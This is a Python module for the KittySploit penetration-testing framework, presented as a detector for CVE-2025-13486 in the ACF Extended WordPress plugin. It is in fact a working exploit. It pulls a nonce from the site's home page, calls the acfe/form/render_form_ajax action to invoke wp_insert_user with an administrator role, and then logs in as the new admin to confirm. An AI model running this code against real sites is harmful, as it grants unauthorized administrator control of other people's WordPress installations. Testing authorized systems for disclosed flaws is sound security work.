#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ACF Extended < 0.9.2 form render RCE / admin user creation (CVE-2025-13486)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "acf-extended"
_VULN_HIGH = (0, 9, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "ACF Extended CVE-2025-13486 detect",
        "description": (
            "Detects CVE-2025-13486 in ACF Extended <= 0.9.1.1: acfe/form/render_form_ajax "
            "allows call_user_func_array via form[render]=wp_insert_user with administrator role."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-13486",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-13486",
            "https://www.wordfence.com/blog/2025/12/100000-wordpress-sites-affected-by-remote-code-execution-vulnerability-in-advanced-custom-fields-extended-wordpress-plugin/",
        ],
        "modules": ["auxiliary/admin/http/acf_extended_cve_2025_13486_admin_create"],
        "tags": ["web", "scanner", "wordpress", "acf-extended", "acfe", "cve-2025-13486"],
        "agent": {
            "risk": "active",
            "approval_required": True,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/acf_extended_cve_2025_13486_admin_create"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    _NONCE = re.compile(r'acf\.data.*?"nonce":"([a-f0-9]+)"', re.S)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def _nonce(self) -> str:
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home:
            return ""
        m = self._NONCE.search(home.text or "")
        return m.group(1) if m else ""

    def run(self):
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._base(), _PLUGIN, "readme.txt"),
            allow_redirects=True,
        )
        if readme and readme.status_code == 200:
            ver = self.wp_extract_version_from_readme(readme.text or "")
            if ver and not self.wp_version_in_range(ver, (0, 0, 0), _VULN_HIGH):
                return False
        nonce = self._nonce()
        if not nonce:
            return False
        user = f"ks{secrets.token_hex(3)}"
        pwd = secrets.token_urlsafe(10)
        email = f"{user}@example.test"
        data = (
            f"action=acfe/form/render_form_ajax&nonce={nonce}"
            f"&form[render]=wp_insert_user&form[user_login]={user}"
            f"&form[user_pass]={pwd}&form[user_email]={email}&form[role]=administrator"
        )
        post = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not post or post.status_code != 200:
            return False
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            self.set_info(
                severity="critical",
                reason="CVE-2025-13486 — administrator created via acfe/form/render_form_ajax",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-13486",
            )
            return True
        return False
